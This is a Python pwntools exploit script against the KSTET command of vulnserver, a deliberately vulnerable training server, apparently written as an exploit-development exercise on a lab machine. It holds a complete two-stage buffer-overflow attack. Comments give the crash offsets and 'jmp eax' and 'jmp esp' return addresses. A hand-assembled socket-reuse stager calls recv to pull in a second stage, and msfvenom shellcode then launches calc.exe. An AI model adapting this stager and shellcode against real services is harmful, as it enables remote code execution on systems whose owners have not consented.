from pwn import *
from time import sleep

ip = "192.168.23.163"
port = 9999

sh = connect(ip, port)

print sh.recvrepeat(1)

# [*] Exact match at offset 70
# Log data, item 5
# Address=625011B1
# Message=  0x625011b1 : jmp eax |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver\essfunc.dll)
# eax points to the start of the buffer, luckily, "KSTET AA" decoded to benign assembly code, left with 60 bytes shellcode space(few bytes were mangled by the previous "KSTET AA" assembly code)
# considering socket-reuse 2-stage exploitation.
# socket at 0x????FB68   0000007C  |... ???? is the same as esp
# ebp overwritten 4 bytes before eip
# 00401953  |. E8 D40B0000    |CALL <JMP.&WS2_32.recv> ; \recv  CALL 0040252C
# esp points to after ret.

shellcode = "\x90"
shellcode += asm("push esp")
shellcode += asm("pop ecx")
shellcode += asm("xor cx, cx")
shellcode += asm("mov cx, 0xfb68") # now ecx contains the address of the socket
shellcode += asm("xor edx, edx")
shellcode += asm("push edx")
shellcode += asm("xor dh, 0x4")
shellcode += asm("push edx")
shellcode += asm("push esp")
shellcode += asm("pop eax")
shellcode += asm("sub eax, 0x11")
shellcode += asm("push eax")
shellcode += asm("push [ecx]")
shellcode += asm("mov eax, 0x040252C0")
shellcode += asm("ror eax, 0x4")
shellcode += asm("call eax")


buf= "KSTET AA"
buf += shellcode
buf += "\xcc"*(68-len(shellcode))

buf += "\xb1\x11\x50\x62"

sh.sendline(buf)

sleep(2)

# while receiving the second stage payload, another bof occurs(I don't know why)
# but anyway, eip offset at 5, esp offset at 25
# Log data, item 4
# Address=62501203
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver\essfunc.dll)

# msfvenom -p windows/exec CMD="calc.exe" -f python -v shellcode
shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
shellcode += b"\x63\x2e\x65\x78\x65\x00"

buf = "A"*5
buf += "\x03\x12\x50\x62"
buf += "B"*(25-len(buf))
buf += "\x90"*30
buf += shellcode
buf += "\x90"*(1024-len(shellcode))

sh.sendline(buf)
sh.close()
